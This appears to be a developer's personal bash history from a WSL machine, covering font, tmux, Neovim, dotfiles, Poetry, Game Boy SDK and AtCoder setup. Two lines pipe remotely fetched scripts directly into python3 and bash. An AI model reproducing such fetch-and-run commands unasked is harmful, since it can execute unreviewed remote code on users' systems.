wget https://github.com/powerline/powerline/raw/develop/font/10-powerline-symbols.conf
mv PowerlineSymbols.otf ~/.local/share/fonts/
fc-cache -vf ~/.config/fontconfig/
fc-cache -vf ~/.local/share/fonts/
mv 10-powerline-symbols.conf ~/.config/fontconfig/conf.d/
fc-match
fc-list
xse
xset
xset 
sudo apt install x11-xserver-utils
xset q
:echo $shell
echo $shell
ls ~/.local/share/fonts/
fccondfig
ls /etc/fonts/ -l
cat /etc/fonts/fonts.conf 
cat /etc/fonts/conf.d
ls /etc/fonts/conf.d
fonts-conf
cd /etc/fonts/conf.d
ls -l
cat 10-powerline-symbols.conf 
fc-cache
fc-cache -vf
fc-cache -vf $XDG_CONFIG_HOME 
fc-cache -vf $XDG_CONFIG_HOME
fc-cache -vf ~/.config/fontconfig/
fc-cache -vf
vim /etc/fonts/local.conf 
suovim /etc/fonts/local.conf 
suovim  /etc/fonts/local.conf 
sudo vim  /etc/fonts/local.conf 
fc-list : file
fc-list : file | grep Powerline
vils ~/.config/fontconfig/
vills~/.config/fontconfi/
ls ~/.config/fontconfig/
cd ~/.config/fontconfig/
touch fonts.conf
fc-cache -vf
vim fonts.conf 
fc-cache -vf
fc-match
fc-match --verbose Sans
cd /etc/fonts/conf.
cd /etc/fonts/conf.d
ls
mv 10-powerline-symbols.conf 99-powerline-symbols.conf
mv 10sudo-powerline-symbols.conf 99-powerline-symbols.conf
mv 10-sudo-powerline-symbols.conf 99-powerline-symbols.conf
sudo my 10-powerline-symbols.conf 10-powerline-symbols.conf
sudo mv 10-powerline-symbols.conf 10-powerline-symbols.conf
sudo mv 10-powerline-symbols.conf 99-powerline-symbols.conf
ls
fc-cache
fc-cache -vf
fc-match
cd ~/.config/fontconfig/
ls
vim fonts.conf 
fc-cache 
fc-match serif
fc-match serif:wight=bold
fc-match
fc-match serif
fc-match -verbose
fc-match --verbose
vim ~/.config/fontconfig/fonts.conf 
fc-cache
vim ~/.config/fontconfig/fonts.conf 
fg
fc-cache
fc-cache --verbose
fc-match --verbose
fc-match
ln -s /etc/fonts/conf.avail/70-no-bitmaps.conf /etc/fonts/conf.d/
ls /etc/fonts/conf.avail/
lls /etc/fonts/conf.d/
ls /etc/fonts/conf.d/
nvim
fdsa
nvim
python3
python3 test.py 
python3 test1.py 
python3 test2.py 
nvim
nvmi
nvim
clangd
nvim
exit
echo unchi
exit
nvim
exit
sudo apt install tmux
tmux
tmux ls
tmux attach -t 0
fg
tmux
nvim
sudo apt install bear
bear
make
man make
fg
lcc
echo $PATH
/mnt/c/Users/takumi/gameboy/gbdk-win/gbdk/bin/lcc.exe 
chmod +x /mnt/c/Users/takumi/gameboy/gbdk-win/gbdk/bin/lcc.exe 
wget https://github.com/gbdk-2020/gbdk-2020/releases/latest/download/gbdk-linux64.tar.gz
ls
man tar
tar -x
man tar -x
tar -zxvf gbdk-linux64.tar.gz 
ls
cd gbdk/
ls
nvim ~/.bashrc
. ~/.bashrc 
echo $GBDKDIR 
cd ~/gbdk/examples/gb/
ls
cat Makefile 
make
lcc
jobs
fg 4
ls
cd ..
ls
cd ..
ls
cd include
ls
cd ..
cd bin
ls
lcc
./lcc
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.11/bin/activate
ls
train.py
python --version
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.11/bin/activate
pyenv versions
python --version
exit
nvim ~/.bash_completion 
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.11/bin/activate
rm ~/.bash_completion 
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.11/bin/activate
python3 --version
python train.py 
poetry 
poetry add numpy
python train.py 
poetry add pandas
python train.py 
sudo apt install zlib1g zlib1g-dev libssl-dev libbz2-dev libsqlite3-dev
python train.py 
find libbz2-dev
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.11/bin/activate
python train.py 
poetry add lightgbm
python train.py 
poetry add matplotlib
python train.py 
poetry add seaborn
python train.py 
poetry add regex
python train.py 
cd input/
ls
unzip jpx-tokyo-stock-exchange-prediction.zip 
python train.py 
ls
cd ..
python train.py 
ls
cd input/
ls
mkdir jpx-tokyo-stock-exchange-prediction
ls
python train.py 
ls
cd ..
python train.py 
nvim
poetry add feather
poetry list
poetry config
poetry config --help
poetry config --list
poetry show
python train.py 
poetry add feather-format
sudo apt install cmake
poetry config --list
poetry env --help
poetry env list --help
poetry env use 3.10
exit
ls
pyenv install list
pyenv install --help
pyenv list
pyenv list --list
pyenv installt --list
pyenv install --list
pyenv install 3.10.8
pyenv env use 3.10.8
poetry env use 3.10.8
pyenv versions
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
python train.py
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
exit
lcc
ls ~/gbdk/lib/
jobs
nvim 
nvim
pyenv
pyenv versions
echo $PYTENV_ROOT
pyenv install --list
curl -sSL https://install.python-poetry.org | python3 -
poetry
poetry self update
poetry completions bash >> ~/.bash_completion
pyenv install --list
pyenv install 3.11.0
ls
cd univ/
ls
cd discrete_algo_lab/
ls
./start_gitlab.sh &
tmux
jobs
fg 2
cd ./univ/discrete_algo_lab/
ls
git clone ssh://gitlab/takeda/lgbm.git
ls
cd lgbm/
ls
pyenv local 3.11.0
pyenv versions
cd ..
pyenv versions
cd lgbm/
ls
clean
clear
ls
ls -l
pyenv versions
poetry init
ls
poetry env info
poetry env use 3.11.0
poetry env use
poetry env info
man poetry
poetry env --help
poetry env use --help
poetry run
poetry run train.py 
poetry shell
ls
pyenv local 3.9.7
ls
pyenv versions
poetry shellpp
poetry run python train.py 
poetry add --help
poetry add flake8 -D
poetry install --no-dev
poetry install --help
poetry shell
pyenv --help
pyenv install 3.11.0
sudo apt update
sudo apt update; sudo apt install make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev
pyenv install 3.11.0
poetry shell
pyenv versions
pyenv local 3.10.8 
python --version
poetry env use 3.10.8
poetry info
poetry env info
poetry shell
poetry config 
poetry config --list
poetry info
poetry show
poetry shell
peotry add numpy
poetry add numpy
poetry run python --version
poetry run python train.py 
poetry install
poetry run python train.py 
poetry lock --help
poetry lock --no-update
poetry add feather-format
poetry run python train.py 
nvim
nivm
nvim
man ln
cd univ/discrete_algo_lab/
./start_gitlab.sh 
cd /mnt/c/Users/takumi/gameboy/picture/animation_360tiles/
make
cd ..
cd sb/
ls
bear
bear make
bear --make
bear -- make
bear -vv -- make
git clone https://github.com/Takeda-Takumi/dotfiles.git~
git clone https://github.com/Takeda-Takumi/dotfiles.git
ls
cd dotfiles/
ls
ls -a
nvim
mkdir backup
cd backup/
ls
mkdir .config
ls
ls -a
cd .config/
ls
mv ~/dotfiles/backup/ ~
ls
ls ~/
cd ~/backup/
ls
ls -a
cd .config/
ls
mv -r ~/.config/nvim/ .
mv  ~/.config/nvim/ .
ls
ls ./nvim/
ls ~/.config/
sudo apt install stow
cd ~/dotfiles/
ls
stow
stow -v
stow -v nvim
ls
ls ~/.config/ -la
ls ~/.config/nvim
git add .
git commit
git config --global core.editor nvim
git commit
git push
git config --global credential.helper 'cache --timeout=10,713,600'
git push
git remote -fv
git remote -v
git remote set-url origin https://Takeda-Takumi@github.com/Takeda-Takumi@github.com/Takeda-Takumi/dotfiles.git
git remote -v
git push
git remote set-url origin https://Takeda-Takumi@github.com/Takeda-Takumi/dotfiles.git
git push
git config --global credential.helper 'cache --timeout=10713600'
git push
git remote -v
git push origin main
git config --list
git config --global credential helper
git remote show
git push
ssh-keygen -C
git push
nvim
vim
nvim
nvmi
nvim
nnvim
nvim
cd ~/.config/nvim/plugins/
ls -la
fg
nvijm
nvim
nvmi
nvim
nvi
nvim
nvim -V10debug.log +q
ls
nvim debug.log 
nvim -V10debug.log +q
nvim debug.log 
nvim -V12debug.log +q
nvim debug.log 
nvim -V12debug.log +q
nvim debug.log 
nvim -V12debug.log +q
nvim
nvim debug.log 
nvim
rm ~/.cache/dein/.cache/init.vim/.dein/plugin/auto-pairs.vim 
ls ~/.cache/dein/.cache/init.vim/.dein/plugin/auto-pairs.vim 
ls ~/.cache/dein/.cache/init.vim/.dein/plugin/
nvim
nvi
nvim
nvim -c "breakadd file ~/.config/.cache/dein/.cache/init.vim/.dein/plugin/auto-pair.vim
nvim
nvim
nvim
nvim
nvim -D
nvim -c "breakadd file ~/.cache/dein/.cache/init.vim/.dein/plugin/auto-pairs.vim" -D
nvim -D
nvim
nvim -D
ls
nvim -V15debug.log +q
nvim debug.log 
nvim -D
nvim
nvijm
nvim
ls ~/.cache/dein/.cache/init.vim/.dein/plugin/

cd ~/dotfiles/
ls
git push
git config --global credential.helper cache
git push
ls
cd nvim/
ls
cd ~/.config/nvim
ls
cd plugins/
ls
rm debug.log 
ls
git add .
git commit
git config --global credential.helper cache
git push
nvim
curl -s https://gist.githubusercontent.com/lifepillar/09a44b8cf0f9397465614e622979107f/raw/24-bit-color.sh | bash
fg
nvim
nvim -u None -N
nvim
cd .config/nvim
ls
mkdir after
fg
ls
nvim
tmux
exit
nvim
exit
ls
cd ~/
g++ test.cpp
./a.out
(cd '/home/takeda' && git push )
exit
tmux split-window -l 30
tmux
cd dotfiles/
ls
ls -l
cd ~/.config/
ls
cd nvim
ls
cd ~/dotfiles/
ls
mkdir tmux
ls
nvim
ls
ls tmux/
ls tmux/ -la
tmux source-file
ls
stow -v tmux/
ls
tmux source-file ~/.tmux.conf 
tmux
tmux source-file ~/.tmux.conf 
tmux
exit
tmux split-window -h -l 30
exit
tmux
nvim ~/.tmux.conf 
exit
tmux source-file ~/.tmux.conf 
tmux ~/.tmux.conf 
nvim ~/.tmux.conf 
tmux source-file ~/.tmux.conf 
nvim ~/.tmux.conf 
tmux source-file ~/.tmux.conf 
nvim
nvim ~/.tmux.conf 
exit
exit
nvim ~/.tmux.conf 
tmux source-file ~/.tmux.conf 
tmux
nvim
exit
nvim ~/.bash_profile 
exit
./a.out
oj
npm install -g atcoder-cli
sudo npm install -g atcoder-cli
acc
acc login
acc session
pip install online-judge-tools
oj
exit
cd ~/univ/discrete_algo_lab/lgbm/
poetry shell
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
python train.py 
exit
cd lgbm/
ls
exit
./univ/discrete_algo_lab/start_gitlab.sh 
exit
xcalc
ping 127.0.0.1 -P 6000
nc localhost -p 6000
nc localhost 6000
telnet localhost 6000
telnet $DISPLAY 6000
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
. ~/.bashrc 
echo $DISPLAY
xeyes
cat /etc/resolv.conf 
export DISPLAY=192.168.112.1:0
xeyes
New-NetFirewallRule -DisplayName "WSL2" -Direction Inbound  -InterfaceAlias "vEthernet (WSL)"  -Action Allow
cat /etc/resolv.conf 
. ~/.bashrc 
echo $DISPLAY
nvim ~/.bashrc
. ~/.bashrc 
echo $DISPLAY
cat /etc/resolv.conf 
xcalc
. ~/.bashrc 
echo $DISPLAY
cat /etc/resolv.conf 
. ~/.bashrc 
echo $DISPLAY
xcalc
exit
nvim
cd ~/univ/discrete_algo_lab/lgbm/
poetry shell
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
python train.py 
exit
poetry shell
exit
echo $DISPLAY 
xcalc
~/.bashrc
sudo nvim ~/.bashrc
cat ~/.bashrc
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
python train.py
cd ..
exit
tmux
powerline-daemon 
powerline-daemon -k
powerline-daemon
pip list -o | grep powerline
pip install -U powerline-status
nvim ~/.tmux.conf 
exit
tmux
nvim ~/.bashrc
exit
nvim ~/.bashrc
. ~/.bashrc
ps
tmux
nvim ~/.bashrc
ps -au
fg
ps -ax
ps -ax | grep tmux
nvim ~/.tmux.conf 
tmux source ~/.tmux.conf 
exit
tmux
mkdir ~/dotfiles/bash
ls -la
cp ~/.bashrc ~/dotfiles/bash/
ls ~/dotfiles/bash/
ls ~/dotfiles/bash/ -la
cp ~/.bash_profile ~/dotfiles/bash/
cp ~/.bash* ~/dotfiles/bash/
ls ~/dotfiles/bash/ -la
cd ~/dotfiles/
ls
stow -v bash
ls
cp ./bash/ ~/backup/
cp ./bash/ ~/backup/ -r
ls ~/backup/
ls ~/backup/ -la
rm ~/.bashrc 
rm ~/.bash_logout 
rm ~/.bash_profile 
rm ~/.bash_history
ls ~/bash*
ls ~/.bash*
stow -v bash
ls ~/ -la
exit
$ git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
ls -la
nvim ~/.tmux.conf 
ls ~/.tmux/
ls ~/.tmux/ -ls
ls ~/.tmux/ -la
cd -r ~/.tmux/ ~/dotfiles/tmux/
cp -r ~/.tmux/ ~/dotfiles/tmux/
ls ~/dotfiles/tmux/
ls ~/dotfiles/tmux/ -la
cd dotfiles/
ls
stow -v tmux
rm ~/.tmux/ -r
rm ~/.tmux/ -rf
stow -v tmux
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
:q
exit
nvim ~/univ/discrete_algo_lab/lgbm/
cd ~/univ/discrete_algo_lab/lgbm/
poetry shell
exit
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
exit
cd ~/univ/discrete_algo_lab/lgbm/
nvim
poetry shell
exit
pyenv shell 3.11.0
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
ls
python train.py 
cd ..
ls
cd lgbm/
ls
cd features/
python create.py 
cd ..
ls
python features/create.py 
python train.py 
python features/create.py 
python train.py 
python features/create.py 
ls
ls ./features/ -la
python features/create.py 
python train.py 
exit
poetry add spica
poetry shell
exit
cd dotfiles/
git add .
ls
cat ~/.tmux.conf 
mv ./tmux/.tmux ~/backup/
ls
ls ./tmux/
ls ./tmux/ -la
stow tmux -v
git add .
git status
git commit -m "update"
git push
cd nvim/.config/
ls
ls -la
ls tmux/ -la
rm tmux/
rm tmux/ -r
ls
ls -la
git add .
git commit -m "nvimの場所にtmuxが混じってたので消した"
git push
cd ..
nvim
stow -v tmux/
git add .
git commit -m "update"
git push
git config --global credential.helper 'cache --timeout=8035200'
git push 
nvim
mkdir bash
ls
nvim ~/.bashrc 
ps -ax | grep [t]mux
ps -ax | grep [t]mux | wc 
ps -ax | grep [t]mux | wc -l
wc --help
ps -ax | grep [t]mux | wc -l

~/univ/discrete_algo_lab/start_gitlab.sh 
nvim
ls -alsfdsafdsa
lsfdsalsfifdsafdsafsakljklfd;sjkljfdsaexit
fdsaifdsa
exit
ls
ls -a
nvim ~/.config/
cd dotfiles/
ls
stow tmux/
ls ~/.tmux
ls
cd tmux/
ls
ls -la
rm ~/.tmux
ls
tmux
tmux
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
exit
tmux
cd ./univ/discrete_algo_lab/
./start_gitlab.sh 
cd ~/univ/discrete_algo_lab/lgbm/
poetry shell 
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
cd ~/univ/discrete_algo_lab/lgbm/
poetry shell
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
cd ~/dotfiles/
git pull
ls
cat install.sh
cat installer.sh 
git rm --cached installer.sh 
ls
git ls-files
rm installer.sh 
git add .
git commit -m "deinのinstallerの削除"
git push
git config --global credential.helper 'cache timeout=8035200'
git push
nvim
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
python run.py 
nvim
rm /home/takeda/.cache/dein/.cache/init.vim/.dein/plugin/auto-pairs.vim
kill %1
nvim
ls
nvim debug.log 
nvim
cd ..
rm debug1.log 
nvim
nvim debug1.log 
nvim
exit
poetry shell
exit
mkdir test
cd test/
ls
mkdir 2
cd 2
cd ..
cd .
cd ..
cd test/
nvim
cd 2
ls
python kyujin.py 
python3 kyujin.py 
exit
pyenv shell 3.11.0
seq 99999999 | tqdm --bytes | wc -l
sudo apt intall python3-tqdm
sudo apt install python3-tqdm
seq 99999999 | tqdm --bytes | wc -l
tmux
fzf
cd univ/discrete_algo_lab/lgbm/
cd ..
./start_gitlab.sh 
cd ~/univ/discrete_algo_lab/lgbm/
nvim
git add .
git commit -m "update"
git push
cd ~/dotfiles/
git add .
git commit -m "update"
git push
cd ~/univ/discrete_algo_lab/lgbm/
poetry shell
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
cd ~/prog/atcoder/
acc new abc
acc new abc278
cd a
cd ./abc278/a/
ls
nvim a.cpp
oj t
ls
oj t
ls
g++ a.cpp 
oj t
oj --help
oj t --help
oj -t -d ./tests
oj -t -d tests
oj t -d tests
g++ a.cpp 
oj t -d tests
g++ a.cpp 
oj t -d tests
g++ a.cpp 
oj t -d tests
g++ a.cpp 
oj t -d tests
g++ a.cpp 
oj t -d tests
exit
cd dotfiles/
git pull
nvim
fg
nvim
cd ~/.cache/dein/repos/github.com/Shougo/vimproc.vim/
make
fg
nvim
acc templates
cd acc config-dir
cd `acc config-dir`
ls
mkdir cpp
ls
cd cpp
nvim
nvi
nvim
nvim'
nvim
nvim
exit
exit
acc new abc278 --template cpp
acc add 
cd abc278/
acc add
tmux list-keys
tmux list-keys | grep C-j
cat ~/.tmux
ls ~/.tmux/ -a
ls ~/.tmux/ -al
cat ~/.tmux.conf 
for i in {0..255}; do     printf "\x1b[38;5;${i}mcolour${i}\x1b[0m\n"; done
nvim
exit
tmux
#!/bin/bash
# Based on: https://gist.github.com/XVilka/8346728
awk -v term_cols="${width:-$(tput cols || echo 80)}" 'BEGIN{
    s="/\\";
    for (colnum = 0; colnum<term_cols; colnum++) {
        r = 255-(colnum*255/term_cols);
        g = (colnum*510/term_cols);
        b = (colnum*255/term_cols);
        if (g>255) g = 510-g;
        printf "\033[48;2;%d;%d;%dm", r,g,b;
        printf "\033[38;2;%d;%d;%dm", 255-r,255-g,255-b;
        printf "%s\033[0m", substr(s,colnum%2+1,1);
    }
    printf "\n";
}'
#!/bin/bash
# Based on: https://gist.github.com/XVilka/8346728 and https://unix.stackexchange.com/a/404415/395213
awk -v term_cols="${width:-$(tput cols || echo 80)}" -v term_lines="${height:-1}" 'BEGIN{
    s="/\\";
    total_cols=term_cols*term_lines;
    for (colnum = 0; colnum<total_cols; colnum++) {
        r = 255-(colnum*255/total_cols);
        g = (colnum*510/total_cols);
        b = (colnum*255/total_cols);
        if (g>255) g = 510-g;
        printf "\033[48;2;%d;%d;%dm", r,g,b;
        printf "\033[38;2;%d;%d;%dm", 255-r,255-g,255-b;
        printf "%s\033[0m", substr(s,colnum%2+1,1);
        if (colnum%term_cols==term_cols) printf "\n";
    }
    printf "\n";
}'
nvim
node -v
n -v
n
n --version
n install 10
sudo n install 10
n list
n
nvim
n
nvim
node --version
sudo n
nvim
find | fzf
cd ~/.config/nvim/
ls -la
find | fzf
cd plugins/
ls
cd ~/
find | fzf
nvim .vimspector.json 
nvim
cd !
cd ~
find | fzf
nvim .vimspector.json 
nvim
nvimm
nvim
cd ~/dotfiles/
stow -v nvim/
fg
node --version
fg
$ ./install_gadget.py --basedir ~/.config/vimspector-config --all --force-all
./install_gadget.py --basedir ~/.config/vimspector-config --all --force-all
exit
tmux
exit
pyenv shell 3.11.0
nvim
ls
ls -l
rm test -r
ls
ls -l
fg
nvim
cd ./dotfiles/
cd nvim/
fg
cd .config/
ls
stow -v -D vimspector-config/
ls ~/
ls ~/.config/
ls ~/.config/ -ls
ls
ls vimspector-config/
stow -h
cd ..
stow -vv -D nvim/
ls -la
ls ~/ -la
ls ~/.config/
fg
ls
stow -vv nvim/
fg
nvim
stow -h
stow -R -vv nvim/
fg
nvim
cd nvim/.vim/
ls
cd ..
rm ls
ls
ls =a
ls -a
rm -r .vim
ls -a
cd ..
stow -vv -R nvim/
ls ~/
ls ~/ -la
ls ~/.vim -la
stow -vv -D nvim/
stow -vv nvim
ls ~/.vim -la
ls ~/.vim/settings/
ls ~/.vim/settings/ -la
rm -f ~/.vim
rm -f ~/.vim/
rm -r ~/.vim/
fg
nvim
ls -la
stow -D ~
stow -D 
stow -D '~'
stow -D '~' -vv
ls ./'~'/
ls ./nvim/
ls
cd 
cd '~'
ls
cd dotfiles/
ls
ls nvim
ls nvim -la
cd ./.config
cd nvim/.config/
ls
ls -la
cd ..
cd ~/dotfiles/
ls
cd nvim/.config/
ls
cd nvim/
ls
cd ~/dotfiles/
rm ./'~' -r
ls
exit
tmux
nvim
cd dotfiles/
ls
stow -vv -R nvim/
fg
ls /home/takeda/.config/vimspector-config
nvim
ls /home/takeda/.config/vimspector-config/configurations/
kill %1
nvim
ls
pwd
stow -R -vvv nvim/
ls ~/ -la
ls ~/ -la | .vim
ls ~/ -la | grep .vim
fg
nvim
cd ~/univ/discrete_algo_lab/lgbm/
poetry shell
. /home/takeda/.cache/pypoetry/virtualenvs/lgbm-J7OgDtw3-py3.10/bin/activate
nvim
ifdsa
fdsa
tmux list-keys
tmux list-keys | grep C-tmux list-keys 
tmux list-keys 
nvim
tmux
cd ~/.c
cd ~/.cache/dein/repos/github.com/puremourning/vimspector/
ls
ls -l
cd ./configurations/
ls -l
ln --help
